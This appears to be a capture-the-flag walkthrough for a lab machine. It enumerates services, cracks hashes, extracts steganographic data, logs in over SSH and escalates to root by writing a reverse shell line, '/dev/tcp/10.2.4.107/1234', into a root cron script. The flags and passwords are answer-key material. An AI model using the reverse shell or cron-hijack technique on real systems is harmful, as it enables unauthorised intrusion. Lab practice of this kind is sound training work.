##  Task 1 - Enumeration through Nmap

```
nmap -Pn -sV --min-rate 5000 10.10.87.113 -vv -p-
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-02 22:09 CDT
NSE: Loaded 46 scripts for scanning.
Initiating Parallel DNS resolution of 1 host. at 22:09
Completed Parallel DNS resolution of 1 host. at 22:09, 0.03s elapsed
Initiating SYN Stealth Scan at 22:09
Scanning 10.10.87.113 [65535 ports]
Discovered open port 80/tcp on 10.10.87.113
Increasing send delay for 10.10.87.113 from 0 to 5 due to 472 out of 1572 dropped probes since last increase.
Discovered open port 6498/tcp on 10.10.87.113
Increasing send delay for 10.10.87.113 from 5 to 10 due to max_successful_tryno increase to 4
Discovered open port 65524/tcp on 10.10.87.113
Increasing send delay for 10.10.87.113 from 10 to 20 due to max_successful_tryno increase to 5
Completed SYN Stealth Scan at 22:09, 16.10s elapsed (65535 total ports)
Initiating Service scan at 22:09
Scanning 3 services on 10.10.87.113
Warning: Hit PCRE_ERROR_MATCHLIMIT when probing for service http with the regex '^HTTP/1\.1 \d\d\d (?:[^\r\n]*\r\n(?!\r\n))*?.*\r\nServer: Virata-EmWeb/R([\d_]+)\r\nContent-Type: text/html; ?charset=UTF-8\r\nExpires: .*<title>HP (Color |)LaserJet ([\w._ -]+)&nbsp;&nbsp;&nbsp;'
Completed Service scan at 22:09, 11.58s elapsed (3 services on 1 host)
NSE: Script scanning 10.10.87.113.
NSE: Starting runlevel 1 (of 2) scan.
Initiating NSE at 22:09
Completed NSE at 22:09, 0.80s elapsed
NSE: Starting runlevel 2 (of 2) scan.
Initiating NSE at 22:09
Completed NSE at 22:09, 0.75s elapsed
Nmap scan report for 10.10.87.113
Host is up, received user-set (0.18s latency).
Scanned at 2024-10-02 22:09:28 CDT for 29s
Not shown: 65532 closed tcp ports (reset)
PORT      STATE SERVICE REASON         VERSION
80/tcp    open  http    syn-ack ttl 61 nginx 1.16.1
6498/tcp  open  ssh     syn-ack ttl 61 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
65524/tcp open  http    syn-ack ttl 61 Apache httpd 2.4.43 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 29.43 seconds
           Raw packets sent: 78655 (3.461MB) | Rcvd: 77223 (3.089MB)

```

How many ports are open?  
3

What is the version of nginx?  
1.16.1

What is running on the highest port?
Apache

## Task 2 Compromising the machine

#### Using GoBuster, find flag 1.  

```
gobuster dir -u http://10.10.87.113/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt -t 50
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.87.113/
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/hidden               (Status: 301) [Size: 169] [--> http://10.10.87.113/hidden/]
Progress: 16310 / 81644 (19.98%)^C
[!] Keyboard interrupt detected, terminating.
Progress: 16360 / 81644 (20.04%)
===============================================================
Finished
===============================================================
```

- nada en /hidden, sigues
```
 gobuster dir -u http://10.10.87.113/hidden/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt -t 50
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.87.113/hidden/
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/whatever             (Status: 301) [Size: 169] [--> http://10.10.87.113/hidden/whatever/]
Progress: 18213 / 81644 (22.31%)^C
[!] Keyboard interrupt detected, terminating.
Progress: 18243 / 81644 (22.34%)
===============================================================
Finished
===============================================================

```

- encuentras /hidden/whatever
```
body>
<center>
<p hidden>ZmxhZ3tmMXJzN19mbDRnfQ==</p>
</center>
</body>
</html>

echo "ZmxhZ3tmMXJzN19mbDRnfQ==" | base64 -d
flag{f1rs7_fl4g}  

```



#### Further enumerate the machine, what is flag 2?  

```
10.10.87.113:65524/robots.txt

User-Agent:*
Disallow:/
Robots Not Allowed
User-Agent:a18672860d0510e5ab6699730763b250
Allow:/
This Flag Can Enter But Only This Flag No More Exceptions

>> identificamos hash

hashid a18672860d0510e5ab6699730763b250
Analyzing 'a18672860d0510e5ab6699730763b250'
[+] MD2 
[+] MD5 
[+] MD4 
[+] Double MD5 
[+] LM 
[+] RIPEMD-128 
[+] Haval-128 
[+] Tiger-128 
[+] Skein-256(128) 
[+] Skein-512(128) 
[+] Lotus Notes/Domino 5 
[+] Skype 
[+] Snefru-128 
[+] NTLM 
[+] Domain Cached Credentials 
[+] Domain Cached Credentials 2 
[+] DNSSEC(NSEC3) 
[+] RAdmin v2.x 


>> crackeamos

https://md5hashing.net/
flag{1m_s3c0nd_fl4g}
```

#### Crack the hash with easypeasy.txt, What is the flag 3?  

http://10.10.87.113:65524/

```
They are activated by symlinking available configuration files from their respective Fl4g 3 : flag{9fdafbd64c47471a8f54cd3fc64cd312} *-available/ counterparts. These should be managed by using our helpers a2enmod, a2dismod, a2ensite, a2dissite, and a2enconf, a2disconf . See their respective man pages for detailed information.

>> crackeamos hash , crackstation
candeger

flag{9fdafbd64c47471a8f54cd3fc64cd312}


```

- What is the hidden directory?  : 
/n0th1ng3ls3m4tt3r

```
En el codigo fuente

body>
    <div class="main_page">
      <div class="page_header floating_element">
        <img src="[/icons/openlogo-75.png](view-source:http://10.10.87.113:65524/icons/openlogo-75.png)" alt="Debian Logo" class="floating_element"/>
        <span class="floating_element">
          Apache 2 It Works For Me
	<p hidden>its encoded with ba....:ObsJmP173N2X6dOrAgEAL0Vu</p>
        </span>
      </div>

>> crackeamos cyberchef / base62

/n0th1ng3ls3m4tt3r

```

#### Using the wordlist that provided to you in this task crack the hash  what is the password?

mypasswordforthatjob

```
<html>
<head>
<title>random title</title>
<style>
	body {
	background-image: url("https://cdn.pixabay.com/photo/2018/01/26/21/20/matrix-3109795_960_720.jpg");
	background-color:black;
	}
</style>
</head>
<body>
<center>
<img src="[binarycodepixabay.jpg](view-source:http://10.10.87.113:65524/n0th1ng3ls3m4tt3r/binarycodepixabay.jpg)" width="140px" height="140px"/>
<p>940d71e8655ac41efb5f8ab850668505b86dd64186a66e57d1483e7f5fe6fd81</p>
</center>
</body>
</html>


>> crackeamos el hash con la lista que nos dieron
940d71e8655ac41efb5f8ab850668505b86dd64186a66e57d1483e7f5fe6fd81

> Primero vemos que tipo de hash es


hash-identifier                                                        
   
 HASH: 940d71e8655ac41efb5f8ab850668505b86dd64186a66e57d1483e7f5fe6fd81

Possible Hashs:
[+] SHA-256
[+] Haval-256

Least Possible Hashs:
[+] GOST R 34.11-94
[+] RipeMD-256
[+] SNEFRU-256
[+] SHA-256(HMAC)
[+] Haval-256(HMAC)
[+] RipeMD-256(HMAC)
[+] SNEFRU-256(HMAC)
[+] SHA-256(md5($pass))
[+] SHA-256(sha1($pass))
john --list=formats

> le aplicamos john

john hash --format=GOST -w=easypeasy_1596838725703.txt
Using default input encoding: UTF-8
Loaded 1 password hash (gost, GOST R 34.11-94 [32/64])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
mypasswordforthatjob (?)     
1g 0:00:00:00 DONE (2024-10-02 22:57) 100.0g/s 514100p/s 514100c/s 514100C/s 123456..sunshine
Use the "--show" option to display all of the cracked passwords reliably
Session completed.>)


mypasswordforthatjob

```


#### What is the password to login to the machine via SSH?

http://10.10.87.113:65524/n0th1ng3ls3m4tt3r/binarycodepixabay.jpg

- descargamos la imagen y le sacamos la info con el pass anterior

```
teghide --extract -sf binarycodepixabay.jpg -p mypasswordforthatjob
wrote extracted data to "secrettext.txt".

cat secrettext.txt       
username:boring
password:
01101001 01100011 01101111 01101110 01110110 01100101 01110010 01110100 01100101 01100100 01101101 01111001 01110000 01100001 01110011 01110011 01110111 01101111 01110010 01100100 01110100 01101111 01100010 01101001 01101110 01100001 01110010 01111001

>> cyberchef
iconvertedmypasswordtobinary


```

#### What is the user flag?

- Ingresamos por ssh
```
ssh boring@10.10.2.7 -p 6498
The authenticity of host '[10.10.2.7]:6498 ([10.10.2.7]:6498)' can't be established.
ED25519 key fingerprint is SHA256:6XHUSqR7Smm/Z9qPOQEMkXuhmxFm+McHTLbLqKoNL/Q.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[10.10.2.7]:6498' (ED25519) to the list of known hosts.
*************************************************************************
**        This connection are monitored by government offical          **
**            Please disconnect if you are not authorized              **
** A lawsuit will be filed against you if the law is not followed      **
*************************************************************************
boring@10.10.2.7's password: 
You Have 1 Minute Before AC-130 Starts Firing
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
!!!!!!!!!!!!!!!!!!I WARN YOU !!!!!!!!!!!!!!!!!!!!
You Have 1 Minute Before AC-130 Starts Firing
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
!!!!!!!!!!!!!!!!!!I WARN YOU !!!!!!!!!!!!!!!!!!!!
boring@kral4-PC:~$ 

boring@kral4-PC:~$ pwd
/home/boring
boring@kral4-PC:~$ cat user.txt 
User Flag But It Seems Wrong Like It`s Rotated Or Something
synt{a0jvgf33zfa0ez4y}
boring@kral4-PC:~$ 

>> Rot13
flag{n0wits33msn0rm4l}


```


#### What is the root flag?

```
boring@kral4-PC:~$ cat /etc/crontab 
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
* *    * * *   root    cd /var/www/ && sudo bash .mysecretcronjob.sh

boring@kral4-PC:~$ 

```

- vemos el contenido del script
```
boring@kral4-PC:~$ ls -la /var/www/.mysecretcronjob.sh 
-rwxr-xr-x 1 boring boring 33 Jun 14  2020 /var/www/.mysecretcronjob.sh
boring@kral4-PC:~$ cat /var/www/.mysecretcronjob.sh 
#!/bin/bash
# i will run as root

>> modificamos el script
nano /var/www/.mysecretcronjob.sh 

cat /var/www/.mysecretcronjob.sh 
#!/bin/bash
# i will run as root
sh -i >& /dev/tcp/10.2.4.107/1234 0>&1

>> Ponemos el listener del otro lado

nc -lnvp 1234

# cd /root
# ls -la
total 40
drwx------  5 root root 4096 Jun 15  2020 .
drwxr-xr-x 23 root root 4096 Jun 15  2020 ..
-rw-------  1 root root  883 Jun 15  2020 .bash_history
-rw-r--r--  1 root root 3136 Jun 15  2020 .bashrc
drwx------  2 root root 4096 Jun 13  2020 .cache
drwx------  3 root root 4096 Jun 13  2020 .gnupg
drwxr-xr-x  3 root root 4096 Jun 13  2020 .local
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
-rw-r--r--  1 root root   39 Jun 15  2020 .root.txt
-rw-r--r--  1 root root   66 Jun 14  2020 .selected_editor
# cat .root.txt
flag{63a9f0ea7bb98050796b649e85481845}

```
